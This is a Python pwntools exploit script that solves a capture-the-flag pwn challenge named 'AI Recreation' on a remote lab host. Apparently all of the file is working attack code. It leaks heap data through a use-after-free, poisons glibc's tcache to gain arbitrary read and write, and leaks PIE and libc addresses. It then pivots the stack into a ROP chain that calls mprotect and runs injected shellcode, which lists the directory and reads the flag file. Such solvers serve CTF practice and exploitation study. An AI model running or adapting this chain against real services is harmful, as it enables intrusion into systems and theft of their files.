#!/usr/bin/env python3
import os
import re
import struct
import subprocess
import sys
from pwn import asm, context, remote

# Remote solver for AI Recreation.
# Usage:
#   source /home/nata/ctf_env/bin/activate
#   python3 solve.py [./challenge]

DEFAULT_CANDIDATES = ["./challenge", "./challenge (4)"]
HOST = "10.42.5.10"
PORT = 1337
REMOTE_LIBC = "./libc_remote.so.6"
MAX_ATTEMPTS = 120

# Fixed offsets inside the challenge binary are also recovered dynamically below.
USER_CHUNK_DELTA = 0xC0
TARGET_BACK_OFFSET = 0x40
PUTS_WRITE_LEN = 0x200
context.arch = "amd64"


def p64(x: int) -> bytes:
    return struct.pack("<Q", x & 0xffffffffffffffff)


def u64(data: bytes) -> int:
    return struct.unpack("<Q", data[:8].ljust(8, b"\x00"))[0]


class Retry(Exception):
    pass


class Tube:
    def __init__(self):
        self.io = remote(HOST, PORT)

    def recv_until(self, marker: bytes, timeout: float = 0.8) -> bytes:
        return self.io.recvuntil(marker, timeout=timeout)

    def send(self, data: bytes) -> None:
        self.io.send(data)

    def sendline(self, data) -> None:
        if isinstance(data, str):
            data = data.encode()
        self.send(data + b"\n")

    def drain(self, timeout: float = 1.5) -> bytes:
        return self.io.recvall(timeout=timeout)

    def close(self) -> None:
        try:
            self.io.close()
        except Exception:
            pass


def run_cmd(args) -> str:
    return subprocess.check_output(args, stderr=subprocess.DEVNULL).decode("latin-1")


def resolve_binary() -> str:
    if len(sys.argv) > 1:
        path = sys.argv[1]
    else:
        path = next((p for p in DEFAULT_CANDIDATES if os.path.exists(p)), None)
        if path is None:
            raise SystemExit("Binary not found. Run: python3 solve.py ./challenge")
    path = os.path.abspath(path)
    os.chmod(path, os.stat(path).st_mode | 0o111)
    return path


def symbol_offset(path: str, symbol: str) -> int:
    out = run_cmd(["readelf", "-sW", path])
    for line in out.splitlines():
        if re.search(rf"\b{re.escape(symbol)}@@", line) or re.search(rf"\b{re.escape(symbol)}$", line):
            parts = line.split()
            if len(parts) >= 2:
                return int(parts[1], 16)
    raise RuntimeError(f"symbol {symbol} not found in {path}")


def binary_text_symbol(binary: str, name_fragment: str) -> int:
    out = run_cmd(["nm", "-C", binary])
    for line in out.splitlines():
        if name_fragment in line:
            return int(line.split()[0], 16)
    raise RuntimeError(f"binary symbol containing {name_fragment!r} not found")


def got_offset(binary: str, symbol: str) -> int:
    out = run_cmd(["readelf", "-rW", binary])
    for line in out.splitlines():
        if f"{symbol}@" in line:
            return int(line.split()[0], 16)
    raise RuntimeError(f"GOT relocation for {symbol} not found")


def text_section(path: str):
    out = run_cmd(["readelf", "-SW", path])
    for line in out.splitlines():
        if " .text " in line:
            # [15] .text PROGBITS <addr> <off> <size> ...
            parts = line.split()
            addr = int(parts[3], 16)
            off = int(parts[4], 16)
            size = int(parts[5], 16)
            return addr, off, size
    raise RuntimeError(".text section not found")


def find_gadget(path: str, pattern: bytes) -> int:
    vaddr, off, size = text_section(path)
    data = open(path, "rb").read()
    idx = data.find(pattern, off, off + size)
    if idx < 0:
        raise RuntimeError(f"gadget {pattern.hex()} not found in {path}")
    return vaddr + (idx - off)


def protect_ptr(pos: int, ptr: int) -> int:
    return (pos >> 12) ^ ptr


def decode_tcache_pair(encoded: int) -> int | None:
    # We leak N1->fd where fd protects N2 and N2 == N1 + 0xc0.
    # Usually encoded = N2 ^ (N2 >> 12). If the +0xc0 crosses a page,
    # pos_page is one less than N2's page, so try both cases.
    for carry in (0, 1):
        y = encoded
        for _ in range(32):
            y = encoded ^ ((y >> 12) - carry)
        n1 = y - USER_CHUNK_DELTA
        if n1 % 0x10 == 0 and ((n1 >> 12) ^ (n1 + USER_CHUNK_DELTA)) == encoded:
            return n1
    return None


def no_newline(data: bytes, what: str) -> bytes:
    # All writes through scanf("%[^\n]") must avoid literal newline bytes.
    # ASLR makes pointer bytes vary, so the solver simply retries on unlucky runs.
    if b"\n" in data:
        raise Retry(f"newline byte in {what}")
    return data


def make_shellcode(mode: str, path: bytes = b"./flag.txt") -> bytes:
    if mode == "marker":
        sc = asm(
            """
            mov edi, 1
            lea rsi, [rip + msg]
            mov edx, 8
            mov eax, 1
            syscall
            xor edi, edi
            mov eax, 60
            syscall
        msg:
            .ascii "SCOKOK!!"
            """
        )
        return no_newline(sc, "shellcode")

    if mode == "ls":
        sc = asm(
            """
            xor edi, edi
            mov dil, 100
            neg edi
            lea rsi, [rip + path]
            mov edx, 0x10000
            xor r10d, r10d
            mov eax, 257
            syscall
            mov edi, eax
            lea rsi, [rip + buf]
            mov edx, 0x400
            mov eax, 217
            syscall
            mov edx, eax
            mov edi, 1
            lea rsi, [rip + buf]
            mov eax, 1
            syscall
            xor edi, edi
            mov eax, 60
            syscall
        path:
            .ascii "."
            .byte 0
        buf:
            """
        )
        return no_newline(sc, "shellcode")

    if mode == "mmapfile":
        if b"\n" in path or b"\x00" in path:
            raise ValueError("flag path must not contain newline or NUL")
        sc = asm(
            f"""
            xor edi, edi
            mov dil, 100
            neg edi
            lea rsi, [rip + path]
            xor edx, edx
            xor r10d, r10d
            mov eax, 257
            syscall
            mov r8, rax
            mov edi, 0x13370000
            mov esi, 0x1000
            mov edx, 1
            mov r10d, 2
            xor r9d, r9d
            mov eax, 9
            syscall
            mov edi, 1
            mov rsi, rax
            mov edx, 0x200
            mov eax, 1
            syscall
            xor edi, edi
            mov eax, 60
            syscall
        path:
            .ascii "{path.decode()}"
            .byte 0
            """
        )
        return no_newline(sc, "shellcode")

    if b"\n" in path or b"\x00" in path:
        raise ValueError("flag path must not contain newline or NUL")

    sc = asm(
        f"""
        xor edi, edi
        mov dil, 100
        neg edi
        lea rsi, [rip + path]
        xor edx, edx
        xor r10d, r10d
        mov eax, 257
        syscall
        mov edi, eax
        lea rsi, [rip + buf]
        mov edx, 0x200
        xor eax, eax
        syscall
        mov edx, eax
        mov edi, 1
        lea rsi, [rip + buf]
        mov eax, 1
        syscall
        xor edi, edi
        mov eax, 60
        syscall
    path:
        .ascii "{path.decode()}"
        .byte 0
    buf:
        """
    )
    return no_newline(sc, "shellcode")


def exploit_once(binary: str, info: dict, attempt: int, shellcode_mode: str, shellcode_path: bytes = b"./flag.txt") -> bytes:
    tube = Tube()

    def main_opt(n: int) -> None:
        tube.recv_until(b"Option> ")
        tube.sendline(str(n))

    def note_opt(n: int) -> None:
        tube.recv_until(b"Option> ")
        tube.sendline(str(n))

    def new_user(name: bytes = b"Alice") -> None:
        main_opt(1)
        tube.recv_until(b"Your username: ")
        tube.sendline(name)

    def create_note(content: bytes | None = None) -> None:
        main_opt(2)
        if content is not None:
            note_opt(2)
            tube.recv_until(b"New bet prediction: ")
            tube.send(no_newline(content, "note content") + b"\n")
        note_opt(4)

    def access_note(idx: int) -> None:
        main_opt(3)
        tube.recv_until(b"Bet ID: ")
        tube.sendline(str(idx))

    def edit_current(payload: bytes) -> None:
        note_opt(2)
        tube.recv_until(b"New bet prediction: ")
        tube.send(no_newline(payload, "edit payload") + b"\n")

    def edit_note(idx: int, payload: bytes) -> None:
        access_note(idx)
        edit_current(payload)
        note_opt(4)

    def delete_note(idx: int) -> None:
        access_note(idx)
        note_opt(3)

    def show_current() -> bytes:
        note_opt(1)
        out = tube.recv_until(b"Option> ")
        marker = out.find(b"1) Show bet")
        if marker == -1:
            marker = len(out)
        return out[:marker].rstrip(b"\n")

    def show_note(idx: int) -> bytes:
        access_note(idx)
        leak = show_current()
        # show_current already consumed the next note-menu prompt.
        tube.sendline("4")
        return leak

    try:
        # Build three adjacent chunks. Deleting N2 then N1 keeps N1 accessible
        # through the stale pointer and leaks N1->fd, which encodes N2.
        new_user()
        create_note(b"A" * 8)
        create_note(b"B" * 8)
        create_note(b"C" * 8)
        delete_note(2)
        delete_note(1)

        heap_leak = show_note(1)
        if len(heap_leak) < 6:
            raise Retry(f"short heap leak: {heap_leak.hex()}")
        n1 = decode_tcache_pair(u64(heap_leak[:6]))
        if n1 is None:
            raise Retry(f"cannot decode heap leak: {heap_leak.hex()}")

        user = n1 - USER_CHUNK_DELTA
        target = user - TARGET_BACK_OFFSET

        # Tcache poison: first allocation returns N1, second returns target=user-0x40.
        edit_note(1, p64(protect_ptr(n1, target)))
        create_note(None)

        # The fake chunk starts 0x40 bytes before the user object. Its constructor
        # clears the pointer array but preserves callback/count. Rebuild enough of
        # the pointer table so note 1 points at user->callback and note 3 points
        # back to the fake chunk for repeated arbitrary writes.
        main_opt(2)
        edit_current(no_newline(b"X" * 0x40 + p64(user + 0x80) + p64(0) + p64(target), "fake ptrs"))
        note_opt(4)

        pie_leak = show_note(1)
        if len(pie_leak) < 6:
            raise Retry(f"short PIE leak: {pie_leak.hex()}")
        callback = u64(pie_leak[:6])
        pie_base = callback - info["print_user"]
        if pie_base & 0xfff or pie_base < 0x500000000000:
            raise Retry(f"bad PIE base: {pie_base:#x}")

        wip_feedback = pie_base + info["wip"]
        puts_got = pie_base + info["puts_got"]

        # Leak libc through puts@got.
        edit_note(3, no_newline(b"Y" * 0x40 + p64(puts_got) + p64(0) + p64(target), "puts got ptr"))
        libc_leak = show_note(1)
        if len(libc_leak) < 6:
            raise Retry(f"short libc leak: {libc_leak.hex()}")
        puts_addr = u64(libc_leak[:6])
        libc_base = puts_addr - info["libc_puts"]
        if libc_base & 0xfff or libc_base < 0x700000000000:
            raise Retry(f"bad libc base: {libc_base:#x}")

        pop_rdi = libc_base + info["pop_rdi"]
        pop_rsi = libc_base + info["pop_rsi"]
        pop_rdx = libc_base + info["pop_rdx"]
        ret = libc_base + info["ret"]
        mprotect = libc_base + info["mprotect"]

        shellcode = make_shellcode(shellcode_mode, shellcode_path)
        shell_addr = (user + 0x800) & ~0xf
        fake_rbp = (user + 0x600) & ~0xf
        frame_base = fake_rbp - 0x50
        heap_page = shell_addr & ~0xfff

        # Write shellcode to heap.
        edit_note(3, no_newline(b"Z" * 0x40 + p64(shell_addr) + p64(0) + p64(target), "shell ptr"))
        edit_note(1, shellcode)

        # Main epilogue after WIPFeedback will pivot to fake_rbp-0x10.
        rop = b"".join(
            p64(x)
            for x in [
                ret,
                pop_rdi,
                heap_page,
                pop_rsi,
                0x2000,
                pop_rdx,
                7,
                mprotect,
                shell_addr,
            ]
        )
        frame = bytearray(b"Q" * 0x58 + rop)
        frame[0x38:0x40] = p64(0)  # fake main local user pointer, harmless
        frame[0x40:0x48] = p64(0)  # pop rbx
        frame[0x48:0x50] = p64(0)  # pop r12
        frame[0x50:0x58] = p64(0)  # pop rbp

        edit_note(3, no_newline(b"W" * 0x40 + p64(frame_base) + p64(0) + p64(target), "frame ptr"))
        edit_note(1, no_newline(bytes(frame), "ROP frame"))

        # Change callback to WIPFeedback. It reads 0x48 bytes into a 0x40-byte
        # stack buffer, so the last qword becomes main's rbp.
        edit_note(3, no_newline(b"V" * 0x40 + p64(user + 0x80) + p64(0) + p64(target), "callback ptr"))
        edit_note(1, no_newline(p64(wip_feedback), "WIPFeedback address"))

        tube.recv_until(b"Feedback: ", timeout=2.0)
        tube.send(b"A" * 64 + p64(fake_rbp))
        tube.recv_until(b"Option> ", timeout=2.0)
        tube.sendline("4")

        out = tube.drain(2.0)
        tube.close()
        return out
    except Exception:
        tube.close()
        raise


def parse_dirents64(data: bytes) -> list[str]:
    names = []
    off = 0
    while off + 19 <= len(data):
        reclen = struct.unpack_from("<H", data, off + 16)[0]
        if reclen < 19 or off + reclen > len(data):
            break
        name_raw = data[off + 19:off + reclen].split(b"\x00", 1)[0]
        try:
            name = name_raw.decode("utf-8", errors="ignore")
        except Exception:
            name = ""
        if name:
            names.append(name)
        off += reclen
    return names


def find_flag_name(entries: list[str]) -> str | None:
    patterns = [
        re.compile(r"^flag[a-zA-Z0-9_{}.:-]*\.txt$"),
        re.compile(r"^flag[a-zA-Z0-9_{}.:-]*$"),
        re.compile(r".*flag.*", re.IGNORECASE),
    ]
    for pattern in patterns:
        for entry in entries:
            if pattern.fullmatch(entry) or pattern.search(entry):
                return entry
    return None


def main() -> None:
    binary = resolve_binary()
    libc = os.path.abspath(REMOTE_LIBC)
    if not os.path.exists(libc):
        raise SystemExit(f"Remote libc not found: {libc}")

    info = {
        "print_user": binary_text_symbol(binary, "printUserNameFn"),
        "wip": binary_text_symbol(binary, "WIPFeedback"),
        "puts_got": got_offset(binary, "puts"),
        "libc_puts": symbol_offset(libc, "puts"),
        "mprotect": symbol_offset(libc, "mprotect"),
        "ret": find_gadget(libc, b"\xc3"),
        "pop_rdi": find_gadget(libc, b"\x5f\xc3"),
        "pop_rsi": find_gadget(libc, b"\x5e\xc3"),
        "pop_rdx": find_gadget(libc, b"\x5a\xc3"),
    }

    print(f"[*] binary: {binary}", file=sys.stderr)
    print(f"[*] libc:   {libc}", file=sys.stderr)

    debug_mode = os.environ.get("SC_MODE")
    debug_path = os.environ.get("FLAG_PATH", "./flag.txt").encode()

    if debug_mode:
        last = b""
        for attempt in range(MAX_ATTEMPTS):
            try:
                out = exploit_once(binary, info, attempt, debug_mode, debug_path)
                last = out
                cleaned = out.replace(b"\x00", b"")
                if cleaned:
                    sys.stdout.buffer.write(cleaned)
                    if not cleaned.endswith(b"\n"):
                        sys.stdout.buffer.write(b"\n")
                    sys.stdout.flush()
                if cleaned:
                    return
            except Retry as e:
                print(f"[*] retry {attempt}: {e}", file=sys.stderr)
                continue
            except (BrokenPipeError, EOFError, OSError) as e:
                print(f"[*] retry {attempt}: process ended early ({e})", file=sys.stderr)
                continue
        print("[-] exploit did not produce output", file=sys.stderr)
        if last:
            print(last.hex(), file=sys.stderr)
        raise SystemExit(1)

    entries: list[str] = []
    for attempt in range(MAX_ATTEMPTS):
        try:
            listing = exploit_once(binary, info, attempt, "ls")
            entries = parse_dirents64(listing)
            flag_name = find_flag_name(entries)
            if flag_name:
                break
        except Retry as e:
            print(f"[*] retry list {attempt}: {e}", file=sys.stderr)
            continue
        except (BrokenPipeError, EOFError, OSError) as e:
            print(f"[*] retry list {attempt}: process ended early ({e})", file=sys.stderr)
            continue
    else:
        print("[-] failed to enumerate remote directory", file=sys.stderr)
        if entries:
            print(entries, file=sys.stderr)
        raise SystemExit(1)

    flag_path = f"/{flag_name}".encode()
    print(f"[*] flag file: {flag_name}", file=sys.stderr)

    last = b""
    for attempt in range(MAX_ATTEMPTS):
        try:
            out = exploit_once(binary, info, attempt, "mmapfile", flag_path)
            last = out
            cleaned = out.replace(b"\x00", b"")
            if cleaned:
                sys.stdout.buffer.write(cleaned)
                if not cleaned.endswith(b"\n"):
                    sys.stdout.buffer.write(b"\n")
                sys.stdout.flush()
            if cleaned:
                return
        except Retry as e:
            print(f"[*] retry read {attempt}: {e}", file=sys.stderr)
            continue
        except (BrokenPipeError, EOFError, OSError) as e:
            print(f"[*] retry read {attempt}: process ended early ({e})", file=sys.stderr)
            continue

    print("[-] exploit did not produce output", file=sys.stderr)
    if last:
        print(last.hex(), file=sys.stderr)
    raise SystemExit(1)


if __name__ == "__main__":
    main()
